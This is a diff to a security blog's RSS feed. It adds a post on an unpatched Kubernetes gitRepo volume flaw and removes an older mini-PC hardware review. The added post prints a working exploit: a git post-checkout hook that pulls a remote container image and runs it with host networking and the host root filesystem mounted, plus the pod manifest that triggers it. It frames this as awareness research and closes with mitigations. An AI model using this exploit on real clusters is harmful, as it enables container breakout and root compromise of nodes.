@@ -7,6 +7,79 @@
 		<atom:link href="https://raesene.github.io/feed.xml" rel="self" type="application/rss+xml" />
 		
 			<item>
+				<title>Fun With GitRepo Volumes</title>
+				<description>&lt;p&gt;On Monday this week I noticed a new and really interesting blog from &lt;a href=&quot;https://x.com/ImreRad&quot;&gt;Imre Rad&lt;/a&gt;. The &lt;a href=&quot;https://irsl.medium.com/sneaky-write-hook-git-clone-to-root-on-k8s-node-e38236205d54&quot;&gt;Blog Post&lt;/a&gt; described an unpatched issue in Kubernetes, which allows any user with the ability to create &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volumes to execute code on the underlying host as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; user! For the details of how this works, please read Imre’s blog as all the cool research is his, I’m just looking at how it might be exploited :)&lt;/p&gt;
+
+&lt;h2 id=&quot;pre-requisites&quot;&gt;Pre-requisites&lt;/h2&gt;
+
+&lt;p&gt;So the first thing to check is, what do I need to be in place for this issue to be exploited. First up we need the &lt;a href=&quot;https://kubernetes.io/docs/concepts/storage/volumes/#gitrepo&quot;&gt;gitRepo&lt;/a&gt; volume type to be available. This has been deprecated since Kubernetes 1.11, which is a long time ago, but critically it’s not been removed from Kubernetes. In my experiments so far I’ve not found a single distribution that didn’t support it, so that’s good.&lt;/p&gt;
+
+&lt;p&gt;Next up, we need the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt; binary to be present on the node, as this volume type directly uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt; binary. From what I’ve seen so far this is a pretty common configuration, with GKE standard, AKS, and RKE all having it present. A default EKS install didn’t but of course I’d guess it could be added if a cluster admin found they needed it. It also wasn’t present in KinD cluster by default, so for my demo I had to add it :D&lt;/p&gt;
+
+&lt;p&gt;The last part of the puzzle is user rights. The user who exploits this needs to have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;create&lt;/code&gt; rights on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pods&lt;/code&gt; and also not be blocked from using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volume type. That volume type is not blocked in &lt;a href=&quot;https://kubernetes.io/docs/concepts/security/pod-security-standards/&quot;&gt;baseline PSS&lt;/a&gt; (at the moment), but isn’t allowed in the restricted profile, so it’s possible this wouldn’t work, but I’d guess quite a few clusters don’t block it.&lt;/p&gt;
+
+&lt;h2 id=&quot;exploiting-the-vulnerability&quot;&gt;Exploiting the vulnerability&lt;/h2&gt;
+
+&lt;p&gt;So now we know what we need, what can we do with this? Well I was wondering if I could do something based on my earlier research on &lt;a href=&quot;https://raesene.github.io/blog/2024/03/24/Using-Tailscale-for-persistence/&quot;&gt;Using Tailscale for persistence&lt;/a&gt;, and create a pod that automatically joins a Tailnet as a bot.&lt;/p&gt;
+
+&lt;p&gt;To do this we’ll need a Docker image that, when run, starts Tailscale and joins the network. That could be kind of risky as we’ll need to embed an Auth key, but fortunately Tailscale provides &lt;a href=&quot;https://tailscale.com/kb/1085/auth-keys#types-of-auth-keys&quot;&gt;one-off&lt;/a&gt; auth keys that will only function a single time. Also we can use Tailscale ACLs to ensure that when a victim joins, they can’t actually reach anything else on the tailnet.&lt;/p&gt;
+
+&lt;p&gt;Next we’ll need to modify Imre’s &lt;a href=&quot;https://github.com/irsl/g&quot;&gt;PoC&lt;/a&gt;. This turns out to be a lot more simple than I thought. Basically you just put any commands you want in the &lt;a href=&quot;https://github.com/raesene/repopodexploit/blob/main/hooks/post-checkout&quot;&gt;post-checkout&lt;/a&gt; script.&lt;/p&gt;
+
+&lt;p&gt;In my example I create a Containerd namespace, then pull my Tailscale joining image, and then run it with host networking, and mounting the host’s root filesystem into the container, which looks a bit like this&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#!/bin/sh
+ctr namespace create sys_net_mon
+ctr -n sys_net_mon images pull docker.io/raesene/gitrepodemo:latest
+ctr -n sys_net_mon run --net-host -d --mount type=bind,src=/,dst=/host,options=rbind:ro docker.io/raesene/gitrepodemo:latest sys_net_mon
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then we just need a manifest that has a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volume which references the repository with our script. For that we just modify Imre’s PoC with our forked repository.&lt;/p&gt;
+
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;v1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Pod&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;test-pd&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;spec&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;containers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;alpine:latest&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;sleep&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;86400&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;test-container&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;volumeMounts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;mountPath&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/gitrepo&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gitvolume&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gitvolume&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;gitRepo&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;directory&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;g/.git&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;repository&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://github.com/raesene/repopodexploit.git&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;revision&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;main&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;pulling-it-all-together&quot;&gt;Pulling it all together&lt;/h2&gt;
+
+&lt;p&gt;So what does this all look like when you run it. Well like most console exploits, not that fancy, but it does demonstrate how someone can go from having &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;create&lt;/code&gt; pod rights to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; on a node, in a single command.&lt;/p&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/9IyowCL8Gd0?si=VkE0n8pDHNegZ1_s&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;h2 id=&quot;preventing-this&quot;&gt;Preventing this!&lt;/h2&gt;
+
+&lt;p&gt;So how do you stop this happening to your cluster. There is a &lt;a href=&quot;https://github.com/kubernetes/kubernetes/pull/124531&quot;&gt;PR&lt;/a&gt; that Imre wrote to fix this. At the moment that’s looking like it will be added to all supported versions of Kubernetes (back to 1.28).&lt;/p&gt;
+
+&lt;p&gt;Until that patched version is in place, you can use admission control to block the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; Volume types. If you have access to ValidatingAdmissionPolicy, then there’s a CEL expression in the &lt;a href=&quot;https://kubernetes.io/docs/concepts/storage/volumes/#gitrepo&quot;&gt;volume description&lt;/a&gt;. Alternatively it should be possible to block this with other common admission control solutions.&lt;/p&gt;
+
+&lt;p&gt;A hack fix would be to remove the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt; binary from your nodes, but that’s not really a great solution…&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;This is an interesting issue, as it’s not been assigned a CVE but, as you can see, could lead to breakout from a container to the underlying node. The goal of this blog has been to demonstrate one possible impact from that and to raise some awareness of why you probably want to fix it, if your threat model includes having users who you want to create pods, but not necessarily give root access to your cluster nodes to!&lt;/p&gt;
+</description>
+				<pubDate>Wed, 10 Jul 2024 18:27:00 +0100</pubDate>
+				<link>https://raesene.github.io/blog/2024/07/10/Fun-With-GitRepo-Volumes/</link>
+				<guid isPermaLink="true">https://raesene.github.io/blog/2024/07/10/Fun-With-GitRepo-Volumes/</guid>
+			</item>
+		
+			<item>
 				<title>Taking a look at Kubernetes Profiling</title>
 				<description>&lt;p&gt;Debugging facilities can always be interesting for attackers, and in general for security, so I decided to take a look at Kubernetes support for Profiling, and where it could be a risk to cluster security. We’ll start with a little bit of background info.&lt;/p&gt;
 
@@ -742,66 +815,6 @@ clean:
 				<pubDate>Sun, 06 Aug 2023 10:27:00 +0100</pubDate>
 				<link>https://raesene.github.io/blog/2023/08/06/fun-with-privileged-container-breakout/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2023/08/06/fun-with-privileged-container-breakout/</guid>
-			</item>
-		
-			<item>
-				<title>Hardware review - Topton AMD Ryzen 7 5700U</title>
-				<description>&lt;p&gt;I’ve been thinking about a project where I could travel to conferences with hardware to run a workshop that doesn’t rely on cloud resources (to avoid those concerns about network access or cloud uptime) and of course, the first part of any project like that is the fun part, buying the hardware! As I’d promised a review to a couple of people on-line, here it is.&lt;/p&gt;
-
-&lt;p&gt;The goals for the hardware were to have something small and light with enough resources that it could support 10-20 students running on it, without breaking the bank. So, I decided to try getting a mini PC from AliExpress, as they have some pretty good deals on there.&lt;/p&gt;
-
-&lt;p&gt;After a bit of looking around and asking friends who had bought systems like this from AliExpress before, I settled on a &lt;a href=&quot;https://www.aliexpress.com/item/1005005762253642.html&quot;&gt;Topton AMD Ryzen 7 5700U&lt;/a&gt;. The model I got cost £352.53.&lt;/p&gt;
-
-&lt;p&gt;The purchase and shipping process was relatively smooth. After clarifying my address with the seller it took 8 days for the system to arrive. It was well packaged and arrived in good condition.&lt;/p&gt;
-
-&lt;h2 id=&quot;specs&quot;&gt;Specs&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;CPU - AMD Ryzen 7 5700U with Radeon Graphics&lt;/li&gt;
-  &lt;li&gt;RAM - 64GB DDR4 3200MHz, fitted as 2x32GB SODIMM&lt;/li&gt;
-  &lt;li&gt;Storage - Fanxiang S500PRO 1TB&lt;/li&gt;
-  &lt;li&gt;Network - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RTL8111/8168/8411 PCI Express Gigabit Ethernet Controller&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Wi-Fi - Wifi6&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;physical-overview&quot;&gt;Physical overview&lt;/h2&gt;
-
-&lt;p&gt;The system is pretty small, measuring 11.5cm x 10.5cm x 4cm, it comes with a power supply and an HDMI cable. The power supply output is a rated as 19V and 3.42A, so 65W. Physically it’s fairly small, 10.5cm x 4.5cm x 3cm. The case is metal and feels fairly solid&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/shoppy.png&quot; alt=&quot;Topton machine from the top&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The port selection is pretty good for such a small machine. On the back there’s power, 2xHDMI, Ethernet, 2xUSB-A, 1xUSB-C and a headphone jack, and on the front another 2xUSB-A.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/shoppy-ports.png&quot; alt=&quot;Topton machine back ports&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;noise&quot;&gt;Noise&lt;/h2&gt;
-
-&lt;p&gt;Anecdotally I found the system to be relatively quiet. I’ve not got a good decibel meter, but took some measurements just using an iPhone app. when the host is idling at 5cm distance from the side, the reading was 30dB, which is around the standard background noise where I am. Periodically with nothing much running there’s a bit of fan noise, taking it up to ~41dB.&lt;/p&gt;
-
-&lt;p&gt;Running a stress test with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stress-ng&lt;/code&gt; on 2 cores, to cause the fans to spin up, takes the volume at 5cm to ~51dB. So it’s not silent, but it’s not too loud either.&lt;/p&gt;
-
-&lt;h2 id=&quot;software&quot;&gt;Software&lt;/h2&gt;
-
-&lt;p&gt;The system came with an install of Windows 11 on it (not sure of the licensing situation for that install…), but for my purposes I wanted Linux, so I installed Debian 12 (Bookworm) on it. The installation process was fine, and the only thing I can see which isn’t supported (yet) is the Wi-Fi which is a Realtek device. A bit of searching suggests that’ll get a drive in the 6.2 kernel.&lt;/p&gt;
-
-&lt;h2 id=&quot;performance&quot;&gt;Performance&lt;/h2&gt;
-
-&lt;p&gt;Next question of course is, what’s the performance like? For this I used the &lt;a href=&quot;https://www.phoronix-test-suite.com/&quot;&gt;phoronix-test-suite&lt;/a&gt; to run a few benchmarks using their docker image &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker run -it phoronix/pts&lt;/code&gt;, with results uploaded to &lt;a href=&quot;https://openbenchmarking.org/&quot;&gt;OpenBenchmarking.org&lt;/a&gt;.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://openbenchmarking.org/result/2307223-NE-APACHERES42&quot;&gt;Apache&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://openbenchmarking.org/result/2307228-NE-SHOPPYIOZ32&quot;&gt;iozone&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Overall the numbers seem pretty reasonable for a system of this class.&lt;/p&gt;
-
-&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
-
-&lt;p&gt;Overall this seems like a pretty good system for the price. Next step will be looking at how to build it as a workshop host for container security workshops.&lt;/p&gt;
-</description>
-				<pubDate>Sat, 22 Jul 2023 10:27:00 +0100</pubDate>
-				<link>https://raesene.github.io/blog/2023/07/22/topton-ryzen-5700U-review/</link>
-				<guid isPermaLink="true">https://raesene.github.io/blog/2023/07/22/topton-ryzen-5700U-review/</guid>
 			</item>
 		
 	</channel>
